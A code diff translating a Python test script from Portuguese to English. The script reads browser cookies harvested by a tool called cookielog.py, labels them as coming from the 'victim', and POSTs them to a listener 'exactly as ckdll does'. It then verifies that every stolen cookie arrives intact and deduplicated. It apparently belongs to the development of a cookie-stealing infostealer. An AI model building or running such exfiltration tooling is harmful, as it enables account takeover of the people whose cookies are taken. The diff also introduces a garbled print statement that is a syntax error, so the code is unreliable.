@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
-"""Test B: vitima real -> fio. Pega cookies_all.json (extraido por cookielog.py
-nesta maquina) e entrega ao listen.py exatamente como o ckdll faz: um POST unico,
+"""Test B: real victim -> wire. Takes cookies_all.json (extracted by cookielog.py
+on this machine) and delivers it to listen.py exactly as ckdll does: one POST,
 Content-Type application/json, X-CookieLog-Host, Connection: close."""
 import json, socket, sys, time, urllib.request
 
@@ -35,12 +35,12 @@ def get(path):
 def main():
     src = json.load(open(r"C:\Users\Dun\Documents\Codigos\tools\cookielog\cookies_all.json", encoding="utf-8"))
     src = [c for c in src if c.get("name") and c.get("domain") and c.get("name") != "password"]
-    print("[vitima] %d cookies extraidos localmente" % len(src))
+    print("[victim] %d cookies extracted locally" % len(src))
 
     st, nbytes, dt = post_raw(RUN, src)
-    print("[fio] %s  %d bytes em %.2fs" % (st, nbytes, dt))
+    print("[wire] %s  %d bytes in %.2fs" % (st, nbytes, dt))
     if "200" not in st:
-        sys.exit("POST falhou: " + st)
+        sys.exit("POST failed: " + st)
 
     got = [c for c in get("/all") if c.get("_host") == RUN]
     fails = []
@@ -50,32 +50,32 @@ def main():
         if not cond:
             fails.append(name)
 
-    check("todos os cookies chegaram", len(got) == len(src), "%d != %d" % (len(got), len(src)))
+    check("all cookies arrived", len(got) == len(src), "%d != %d" % (len(got), len(src)))
 
-    # valor exato por (browser, profile, domain, name, path)
+    # Exact value keyed by (browser, profile, domain, name, path).
     def key(c):
         return (c.get("browser"), c.get("profile"), c.get("domain"), c.get("name"), c.get("path"))
     a = {key(c): c.get("value") for c in src}
     b = {key(c): c.get("value") for c in got}
     missing = [k for k in a if k not in b]
     diff = [k for k in a if k in b and a[k] != b[k]]
-    check("nenhum registro perdido na identidade", not missing, missing[:3])
-    check("valores identicos byte a byte", not diff, diff[:3])
+    check("no record lost on identity", not missing, missing[:3])
+    check("values identical byte for byte", not diff, diff[:3])
 
     uni = [c for c in got if any(ord(ch) > 127 for ch in (c.get("value") or ""))]
-    print("  [info] %d valores com caractere nao-ASCII sobreviveram" % len(uni))
+    print("  [info] %d values with non-ASCII characters survived" % len(uni))
     empty = [c for c in got if not c.get("value")]
     src_empty = [c for c in src if not c.get("value")]
-    check("cookies v20 nao-decriptados preservados como vazio", len(empty) == len(src_empty),
+    check("undecrypted v20 cookies preserved as empty", len(empty) == len(src_empty),
           "%d vs %d" % (len(empty), len(src_empty)))
 
-    # reenvio do mesmo dump nao deve inflar a colecao
+    # Resending the same dump must not inflate the collection.
     before = len(get("/all"))
     post_raw(RUN, src)
     after = len(get("/all"))
-    check("reenvio do dump inteiro nao duplica", before == after, "%d -> %d" % (before, after))
+    check("resending the whole dump does not duplicate", before == after, "%d -> %d" % (before, after))
 
-    print("\n=== %d falhas ===" % len(fails))
+    print("\n"=== %d failures ==="" % len(fails))
     for f in fails:
         print("  - " + f)
     return 1 if fails else 0
